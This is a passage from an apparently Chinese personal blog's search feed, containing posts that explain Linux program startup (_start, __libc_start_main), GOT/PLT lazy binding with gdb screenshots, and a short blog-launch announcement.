class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">             <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">             <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure></blockquote><ul><li>当<code>___libc_start_main</code>正常执行的时候，会在<code>exit</code>处退出，而<code>hlt</code>的是为了保证程序在<code>___libc_start_main</code>调用失败的时候不会让程序一直在跑，它就是充当一个栅栏，强行把程序停下来.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048340 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048340                 xor     ebp, ebp</span><br><span class="line">.text:08048342                 pop     esi</span><br><span class="line">.text:08048343                 mov     ecx, esp</span><br><span class="line">.text:08048345                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048348                 push    eax</span><br><span class="line">.text:08048349                 push    esp             ; stack_end</span><br><span class="line">.text:0804834A                 push    edx             ; rtld_fini</span><br><span class="line">.text:08048356                 lea     eax, (__libc_csu_fini - 804A000h)[ebx]</span><br><span class="line">.text:0804835C                 push    eax             ; fini</span><br><span class="line">.text:0804835D                 lea     eax, (__libc_csu_init - 804A000h)[ebx]</span><br><span class="line">.text:08048363                 push    eax             ; init</span><br><span class="line">.text:08048364                 push    ecx             ; ubp_av</span><br><span class="line">.text:08048365                 push    esi             ; argc</span><br><span class="line">.text:08048366                 mov     eax, offset main</span><br><span class="line">.text:0804836C                 push    eax             ; main</span><br><span class="line">.text:0804836D                 call    ___libc_start_main</span><br><span class="line">.text:08048372                 hlt</span><br><span class="line">.text:08048372 _start          endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400450 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400450 ; __unwind &#123;</span><br><span class="line">.text:0000000000400450                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400452                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400455                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400456                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400459                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040045D                 push    rax</span><br><span class="line">.text:000000000040045E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040045F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000400466                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:000000000040046D                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400474                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000040047A                 hlt</span><br><span class="line">.text:000000000040047A ; &#125; // starts at 400450</span><br></pre></td></tr></table></figure><p>删除大量的宏之后，留下了一些比较重要的函数，如下：</p><blockquote><p><code>atexit</code>函数有个特点，就是当<code>main</code>函数返回的时候才会执行</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="keyword">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"><span class="comment">//=======================================</span></span><br><span class="line"></span><br><span class="line">  __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><p>程序的最终调用链（简化版）是：</p><p><code>_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt; main -&gt; exit</code></p><p>看完之后，看看下面这张图片是不是很亲切！</p><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/3-1633405730636.png" class=""><p>参考文章：</p><p><a href="https://luomuxiaoxiao.com/?p=516#i">Linux X86 程序启动 – main函数是如何被执行的？</a></p><p>《程序员的自我修养》P317</p>]]></content>
      
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定</title>
      <link href="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
      <url>/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>程序在动态载入内存的时候并不会将所有函数都加载进内存，而是采用延时绑定的机制，即当真正使用当该函数的时候才将<code>GOT</code>表中的地址转化成真实的地址，</p><p>写一个简单的<code>demo</code>进行测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -g -o got_plt got_plt.c </span></span><br></pre></td></tr></table></figure><p>编译完成后，我们进入<code>gdb</code>进行调试，先将程序反汇编，我们来看看在那下断点合适，我们既然要研究<code>plt</code>和<code>got</code>表，那肯定要断在<code>call put</code>这条汇编指令这吧，下断点我们来看看</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/3.png" class=""><p>下完断点，我们运行起来，单步步入就来到图中的地方，它先跳到<code>_GLOBAL_OFFSET_TABLE_</code>里面，也就是我们说的<code>GOT</code>表，那它会<code>JMP</code>到哪里去呢？等下揭晓….</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1.png" class=""><p>我们用<code>pwndbg</code>查看一下这个位置存了什么，是不是有点眼熟，这不就是刚刚<code>JMP</code>的下一条指令的地方吗？没错它又跳回来了…紧接着它<code>push</code>了一个参数又往下跳转了，又<code>push</code>了一个参数就跳到<code>_dl_runtime_resolve_</code>这个函数里面，在这就不详细的阐述<code>_dl_runtime_resolve_</code>函数的具体实现，咱只要记得是这个函数帮我们把<code>GOT</code>表里面的值换成了真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/2.png" class=""><p>我们在此函数执行完成之后再去看<code>0x804a00c</code>里面存的是什么，对吧…现在就是真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/4.png" class=""><p>如果还是保持怀疑，我们反汇编进去看看，是<code>put</code>函数的实现对吧…</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5.png" class=""><p>最后提一嘴，<code>GOT</code>表只是存放函数地址的表而已，真正的调用是需要通过<code>PLT</code>表来进行跳转</p><p>下面是一位大佬画的图就拿来用了：</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-bcf9343191848103.png" class="" title="5970003-bcf9343191848103"><p>延迟绑定完成之后就可以直接去<code>GOT</code>里面拿真实的函数地址啦！</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-9baedd55881a39dd.png" class="" title="5970003-9baedd55881a39dd">]]></content>
      
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梦开始的地方</title>
      <link href="/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/"/>
      <url>/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<p><code>ZYen</code>的小站自今天起就正式开张啦！之前买服务器搭博客不得劲，现在正式转为<code>github</code>辽，文章的日期可能有点问题，不过无伤大雅，愿自己热爱的事情最终都能有个好结果！（撒花✨）</p>]]></content>
      
      
      
        <tags>
            
            <tag> -杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
